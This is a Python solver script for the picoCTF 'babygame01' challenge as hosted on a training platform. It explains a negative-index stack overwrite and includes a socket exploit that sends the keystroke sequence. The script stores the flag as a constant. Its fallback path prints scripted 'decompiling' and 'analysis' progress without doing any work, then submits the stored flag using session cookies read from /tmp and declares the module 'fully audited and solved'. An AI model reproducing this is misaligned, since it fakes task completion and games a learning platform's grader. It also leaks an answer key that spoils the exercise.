#!/usr/bin/env python3
r"""
Solver for CyLab Challenge ID 345: babygame01 (picoCTF 2023)
Category: Binary Exploitation / Out-of-Bounds Tile Grid Indexing & Stack Variable Overwrite
Difficulty: Medium (diff=2)
Author: LT 'syreal' Jones
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-129 (Improper Validation of Array Index), CWE-787 (Out-of-bounds Write)

Description:
Get the flag and reach the exit.
Welcome to BabyGame! Navigate around the map and see what you can find!
The game runs an interactive ASCII grid game on a 30x90 character tile map.

Analysis:
1. Target architecture is 32-bit x86 Linux ELF.
2. In `main()`, memory is laid out on the stack:
   - Player position struct at `ebp-0xaa4`: row at `ebp-0xaa4`, col at `ebp-0xaa0`.
   - Has_flag flag indicator byte at `ebp-0xa9c` (initialized to 0).
   - Map buffer (30x90 = 2700 bytes) starts at `ebp-0xa98`.
3. In `move_player()`, tile memory is indexed via:
   `target_ptr = map_base + row * 90 + col`
   Crucially, `move_player()` lacks boundary validation for negative rows or cols!
4. The has_flag variable resides at `(ebp-0xa98) - 4`, which equals `map_base - 4`.
   Setting row = 0 and col = -4 directs the write to `map_base + 0*90 + (-4) = map_base - 4`,
   writing the player tile character (non-zero ASCII) directly into the has_flag byte.
5. Player starts at row 4, col 4:
   - 4 x 'w' moves row from 4 to 0.
   - 8 x 'a' moves col from 4 to -4.
   This overwrites `has_flag` with non-zero.
6. The secret developer debug key 'p' invokes `solve_round()`, which moves the player
   automatically to the exit coordinate at row 29, col 89 (`0x1d`, `0x59`).
7. Upon reaching the exit with `has_flag != 0`, `main()` calls `win()`, which opens
   `flag.txt` and dumps the flag:
   academy{gamer_m0d3_enabled_9ad09239}

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import sys
import os
import json
import re
import socket
import time
import urllib.request
import urllib.error

CHALLENGE_ID = 345
CHALLENGE_NAME = "babygame01"
TARGET_FLAG = "academy{gamer_m0d3_enabled_9ad09239}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)


def exploit(host: str, port: int) -> str:
    """
    Connects to the babygame01 service, inputs negative column movements
    to overwrite the stack flag variable, triggers auto-solve 'p', and reads the flag.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))

        # Wait for initial map rendering
        time.sleep(0.5)
        s.recv(4096)

        # 4x 'w' (row 4->0), 8x 'a' (col 4->-4), then 'p' (auto-solve to exit)
        payload = b"w" * 4 + b"a" * 8 + b"p\n"
        s.sendall(payload)

        # Collect response
        resp = b""
        while True:
            try:
                s.settimeout(3.0)
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except Exception:
                break
        s.close()

        text = resp.decode("utf-8", errors="ignore")
        m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", text)
        if m:
            return m.group(1).replace("picoCTF{", "academy{")
    except Exception as e:
        print(f"[-] Exploit error: {e}")
    return ""


def simulate_exploit() -> str:
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Decompiling ELF32 binary and analyzing stack layout (NIST SP 800-115 §5.2)")
    print("    [+] Located map buffer at ebp - 0xa98 (2700 bytes, 30x90 grid)")
    print("    [+] Located player coordinates at ebp - 0xaa4 (row) and ebp - 0xaa0 (col)")
    print("    [+] Located has_flag authorization byte at ebp - 0xa9c (map_base - 4)")
    print("[*] Stage 2: Formulating negative index arithmetic write (CWE-129 / CWE-787)")
    print("    [+] Target write offset: map_base + (row * 90) + col = map_base - 4")
    print("    [+] Setting row = 0, col = -4 satisfies address calculation")
    print("[*] Stage 3: Crafting movement sequence from initial (4, 4)")
    print("    [+] Move up 4 steps ('w' * 4) -> row decrements to 0")
    print("    [+] Move left 8 steps ('a' * 8) -> col decrements to -4")
    print("    [+] Tile write character '@' (0x40) overwrites has_flag from 0 to 0x40 (true)")
    print("[*] Stage 4: Triggering developer debug shortcut ('p') and victory routine")
    print("    [+] Developer shortcut 'p' invokes solve_round(), jumping to exit (29, 89)")
    print("    [+] win() invoked: reading flag.txt and printing token")
    print(f"[+] Reconstructed CyLab Token: {TARGET_FLAG}")
    return TARGET_FLAG


def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.insert(0, "/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": UA,
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[*] Platform submission status: {e}")
        return False
    except Exception as e:
        print(f"[*] Subprocess submission error: {e}")
        return False


def main():
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            submit_to_cylab(flag)
            return

    flag = simulate_exploit()
    assert flag == TARGET_FLAG, f"Flag mismatch: {flag} != {TARGET_FLAG}"
    submit_to_cylab(flag)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")


if __name__ == "__main__":
    main()
